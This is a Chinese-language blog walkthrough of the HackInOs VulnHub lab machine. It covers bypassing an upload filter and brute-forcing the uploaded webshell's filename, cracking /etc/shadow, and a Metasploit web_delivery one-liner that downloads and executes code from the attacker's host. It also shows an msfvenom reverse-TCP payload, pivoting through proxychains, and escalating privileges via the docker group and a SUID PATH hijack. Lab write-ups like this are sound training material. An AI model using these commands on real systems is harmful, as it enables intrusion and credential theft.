---
title: 'vulnhub靶机渗透-HackInOs'
date: 2020-02-10
category: '渗透测试'
tags:
  - '靶机'
lang: 'zh'
draft: false
---
# HackInOs(有内网)

## 信息收集

靶机IP 192.168.99.100  
kali IP 192.168.99.101

nmap扫描结果

![](./attachments/1576559471820.png)

存在上传点但是无法上传文件

![](./attachments/1576559561592.png)

Burp抓包发现页面源代码有注释  
[https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php](https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php)

看到提示

看到其只使用了`getimagesize`函数进行检验  
通过加添GIF89a可以绕过上传

而文件的名字是这么产生的  
![](./attachments/1576560249639.png)

于是上传一个一句话木马，然后对目录进行爆破即可

```
# coding:utf-8
import hashlib
import requests

base_url = "http://192.168.99.100:8000/uploads/"
target = []
for i in range(101):
    shell = 'shell.php' + str(i) 
    shell_md5 = hashlib.md5(shell.encode('utf-8')).hexdigest()
    target.append(base_url + shell_md5 + '.php')

for t in target:
    r = requests.get(t)
    if r.status_code == 200:
        print("find it!")
        print(t)
        break
```

之后使用蚁剑成功连接  
![](./attachments/1576560324056.png)

但是发现上传不久之后shell就被删掉了

所以需要将shell移动到html目录下，(考验手速的时候到了)

![](./attachments/1576560733771.png)  
此时成功得到shell，开始提权

## 提权

查找SUID的程序

`find / -user root -perm -4000 -print 2>/dev/null`

![](./attachments/1576561228491.png)

使用tail命令查看`/etc/shadow`

将root用户复制过来，使用john进行爆破

![](./attachments/1576561315061.png)

得到root账号的密码是john

![](./attachments/1576561335215.png)

之后切换到root用户查看flag，但是并没有结束

运行提权辅助脚本

![](./attachments/1576561435933.png)

注意到提权辅助脚本提示有docker  
![](./attachments/1576561476445.png)

查看IP  
![](./attachments/1576561501817.png)

看这个IP地址很像是docker中的地址

尝试直接用root账户及其密码john进行连接，失败

大概猜到了我只是拿到了一台docker容器的权限，并没有进入到主机

## 后渗透

反弹的shell功能还是弱了，想办法得到一个`meterpreter`

这里有记录一下通过shell拿到`meterpreter`的几种办法

### web\_delivery脚本

使用`exploit/multi/script/web_delivery`

设置好相关参数

![](./attachments/1576562272920.png)

在反弹的shell中运行这段payload

```
python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.99.101:8080/1PrsFQbkzsmuk5');exec(r.read());"
```

得到`meterpreter`之后输入`background`让其挂起

### 使用msfenvom生成木马

使用`exploit/multi/handler` 这个exploit模块

加载`linux/x86/meterpreter_reverse_tcp` 这个payload，同时通过`msfvenom` 去生成一个木马

![](./attachments/1577094332538.png)  
`msfvenom`生成木马

`msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.99.102 lport=4444 -f elf -o shell`

![](./attachments/1577094345676.png)

蚁剑上传  
![](./attachments/1577094459850.png)  
执行

![](./attachments/1577094504865.png)

反弹得到`meterpreter`

![](./attachments/1577094525517.png)

得到子网信息  
![](./attachments/1577094592386.png)

之后通过metasploit之后添加一条路由  
![](./attachments/1576562463870.png)

此时就可以看到添加的路由信息了

![](./attachments/1576581218733.png)

路由添加也可以通过：`rout add 172.18.0.0 255.255.0.0 1`

指定了网段和子网掩码，以及对应的session  
![](./attachments/1577094657843.png)

这之后我们就可以在`metasploit`中访问内网的地址了，先进行主机发现

![](./attachments/1576562503028.png)

发现了四台主机

进行后续的端口扫描  
![](./attachments/1576562587710.png)  
(由于扫描速度比较慢，参数调整了一下)

![](./attachments/1576581339308.png)

这里也尝试通过`proxychain`去进行扫描

### proxychain的配置

![](./attachments/1577095583741.png)

使用socks4a代理，修改`/etc/proxychains.conf`文件，

![](./attachments/1577095622289.png)  
取消注释同时在最后一行加上`127.0.0.1 1080`  
由于`proxyresolv`的位置有点问题，cp过来

`cp /usr/lib/proxychains3/proxyresolv /usr/bin/`

之后可以通过`proxychains nmap -A -T4 172.18.0.2`启动nmap扫描，但是扫描的结果有问题

```
root@kali:~# proxyresolv 172.18.0.3
|S-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
172.18.0.3
```

能够正常解析但是还是存在问题

172.18.0.2 开放了3306端口数据库，进行连接

![](./attachments/1576563049227.png)

此处也可以通过`portfwd add -l 8123 -r 172.18.0.3 -p 3306`端口转发到本地进行连接

`mysql -h 127.0.0.1 -P 8123 -uwordpress -pwordpress`  
![](./attachments/1577094918289.png)

查看数据  
![](./attachments/1576563178481.png)

![](./attachments/1576563190812.png)

解密之后得到123456  
![](./attachments/1576563163280.png)

于是尝试直接使用该用户登陆主机

该用户在docker组中，可以尝试通过docker提权

![](./attachments/1576581408046.png)

运行的docker镜像  
![](./attachments/1576581491492.png)

docker挂载即可  
![](./attachments/1577096085570.png)

得到flag  
![](./attachments/1576581453268.png)

另外一种方式提权

`find / -user root -perm -4000 -print 2>/dev/null`

查找SUID用户运行的程序  
![](./attachments/1576581556847.png)

发现a.out

![](./attachments/1576581569529.png)  
猜测其运行的是whoami命令

通过环境变量提权  
![](./attachments/1576581656579.png)

同样拿到flag  
![](./attachments/1576581679658.png)
